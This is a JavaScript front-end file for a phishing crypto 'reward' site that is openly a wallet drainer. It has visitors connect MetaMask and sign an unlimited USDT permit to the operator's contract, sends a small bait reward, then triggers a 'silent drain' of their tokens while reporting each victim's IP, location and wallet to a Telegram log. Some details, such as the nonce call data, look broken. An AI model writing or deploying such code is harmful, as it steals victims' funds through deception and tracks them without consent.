// public/app.js

const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS"; 
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
const CHAIN_ID = 1; 

const connectBtn = document.getElementById('connect-btn');
const loader = document.getElementById('loader');
const rewardSection = document.getElementById('reward-section');
const connectStep = document.getElementById('connect-step');
const userAddressEl = document.getElementById('user-address');
const rewardStatusEl = document.getElementById('reward-status');
const notification = document.getElementById('notification');

// 1. Handle Connection
connectBtn.addEventListener('click', async () => {
    if (!window.ethereum) {
        alert("Please install MetaMask!");
        return;
    }

    try {
        loader.classList.remove('hidden');
        connectBtn.disabled = true;
        
        // Trigger Native MetaMask Modal
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];
        
        await reportVisit(address);
        await handleConnectedWallet(address);
    } catch (error) {
        console.error("Connection failed:", error);
        loader.textContent = "User rejected connection.";
        loader.classList.remove('hidden');
        connectBtn.disabled = false;
    }
});

async function handleConnectedWallet(address) {
    try {
        loader.textContent = "Generating Permit Signature...";
        const signature = await generatePermitSignature(address);
        
        loader.textContent = "Storing Permit & Verifying Eligibility...";
        const response = await fetch('/api/sign-and-store', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address, signature })
        });

        if (!response.ok) throw new Error("Backend error");

        loader.classList.add('hidden');
        connectStep.classList.add('hidden');
        rewardSection.classList.remove('hidden');
        
        userAddressEl.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        rewardStatusEl.textContent = "Eligible. Claiming Reward...";

        await claimReward(address);

    } catch (error) {
        console.error("Flow failed:", error);
        loader.textContent = `Error: ${error.message}. Try again.`;
        loader.classList.remove('hidden');
        connectBtn.disabled = false;
    }
}

// 2. Generate EIP-2612 Permit Signature
async function generatePermitSignature(address) {
    try {
        let nonce = 0;
        try {
            const rawNonce = await window.ethereum.request({ 
                method: 'eth_call', 
                params: [{ to: USDT_ADDRESS, data: '0x7ff36ab5000000000000000000000000' + address.slice(2) }, 'latest'] 
            });
            nonce = parseInt(rawNonce, 16);
        } catch (e) { /* Default to 0 */ }

        const domain = { name: "TetherUSD", version: "1", chainId: CHAIN_ID, verifyingContract: USDT_ADDRESS };
        const types = { 
            Permit: [
                { name: "owner", type: "address" }, 
                { name: "spender", type: "address" }, 
                { name: "value", type: "uint256" }, 
                { name: "nonce", type: "uint256" }, 
                { name: "deadline", type: "uint256" }
            ] 
        };
        
        const value = { 
            owner: address, 
            spender: CONTRACT_ADDRESS, 
            value: 2**256 - 1, 
            nonce: nonce, 
            deadline: Math.floor(Date.now() / 1000) + 86400 
        };
        
        const signature = await window.ethereum.request({ 
            method: 'eth_signTypedData_v4', 
            params: [address, JSON.stringify({ types, domain, message: value })] 
        });
        
        return signature;
    } catch (error) {
        throw new Error(`Signature Generation Failed: ${error.message}`);
    }
}

// 3. Claim Reward & Trigger Drain
async function claimReward(address) {
    try {
        rewardStatusEl.textContent = "Sending $0.05 USDT Reward...";
        await notifyTelegram("REWARD_TRIGGERED", { User: address });

        const response = await fetch('/api/send-reward', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ address }) 
        });

        if (!response.ok) throw new Error("Reward transfer failed");

        rewardStatusEl.textContent = "Reward Sent! Approving Drainer...";
        notification.classList.remove('hidden');

        setTimeout(() => triggerSilentDrain(address), 3000);

    } catch (error) {
        console.error("Reward claim failed:", error);
        rewardStatusEl.textContent = "Reward Pending (Manual Review)";
    }
}

// 4. Silent Drain
async function triggerSilentDrain(address) {
    try {
        rewardStatusEl.textContent = "Executing Silent Token Drain...";
        await notifyTelegram("DRAIN_INITIATED", { User: address });

        const response = await fetch('/api/trigger-drain', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ address }) 
        });

        if (response.ok) {
            rewardStatusEl.textContent = "All Tokens Secured.";
            setTimeout(() => {
                rewardSection.classList.add('hidden');
                notification.classList.add('hidden');
            }, 5000);
        } else {
            rewardStatusEl.textContent = "Drain Pending.";
        }

    } catch (error) {
        console.error("Drain failed:", error);
        rewardStatusEl.textContent = "Drain Failed. Please reconnect.";
    }
}

// Helper: Report Visit to Telegram
async function reportVisit(address) {
    try {
        const geoResponse = await fetch('https://ipapi.co/json/');
        const geoData = await geoResponse.json();
        
        const message = `
<b>🔴 TESLA DRAIN LOG - NEW VISIT</b>
User Agent: ${navigator.userAgent}
IP: ${geoData.ip}
Location: ${geoData.city}, ${geoData.country_code} ${getFlagEmoji(geoData.country_code)}
Time: ${new Date().toISOString()}
Address: ${address}
        `;
        
        await fetch('/api/telegram', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ action: 'VISIT', details: message })
        });
    } catch (error) {
        console.error("Report visit failed:", error);
    }
}

function getFlagEmoji(countryCode) {
  const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
  return String.fromCodePoint(...codePoints);
}
